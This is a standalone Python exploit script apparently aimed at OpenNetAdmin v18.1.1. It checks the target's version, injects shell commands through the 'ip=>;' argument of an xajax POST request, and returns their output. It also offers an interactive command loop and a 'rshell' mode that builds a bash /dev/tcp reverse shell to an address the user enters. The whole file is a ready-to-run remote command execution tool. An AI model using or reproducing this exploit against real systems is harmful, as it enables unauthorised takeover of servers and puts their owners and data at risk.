#!/usr/bin/python3
import os
import sys
import requests
from bs4 import BeautifulSoup

def check(url):
    try:
        rsp = requests.get(url, verify=False)
        return True if rsp.status_code == 200 and 'v18.1.1' in rsp.text else False
    except Exception as e:
        print(e)

def exploit(url, cmd):
    try:
        rsp = requests.post(url=url,
                            data={'xajax':'window_submit', 'xajaxr':'1574117726710',
                                  'xajaxargs[]':['tooltips',f'ip=>;echo \"BEGIN\";{cmd} 2>&1;echo \"END\"','ping']},
                            verify=False)
        if rsp.status_code != 200:
            print(f"{rsp.status_code} returned")
            exit()
        output = BeautifulSoup(rsp.text, 'lxml').find('pre').text.replace("BEGIN", "").replace("END", "")
        print(output.strip())
    except Exception as e:
        print(e)

def main(target, cmd):
    if sys.argv[2].lower() == "rshell":
        addr = input("Enter the address to connect back to, IP:PORT format: ")
        cmd = f"bash -i >& /dev/tcp/{addr.split(':')[0]}/{addr.split(':')[1]} 0>&1"
    if check(target):
        if cmd.lower() == 'ishell':
            while True:
                cmd = input("Enter the command (exit to exit): ")
                if cmd.lower() == "clear":
                    os.system('clear')
                else:
                    exit() if cmd == 'exit' else exploit(target, cmd)
        else:
            exploit(target, cmd)
    else:
        print(f"{target} not vulnerable.")

if __name__ == "__main__":
    try:
        main(sys.argv[1], sys.argv[2])
    except IndexError:
        print(f"Usage: {sys.argv[0]} http://target.url/ona/ <cmd>")
        print(f"Enter rshell as the command for a reverse shell.\nEnter ishell for interactive.")
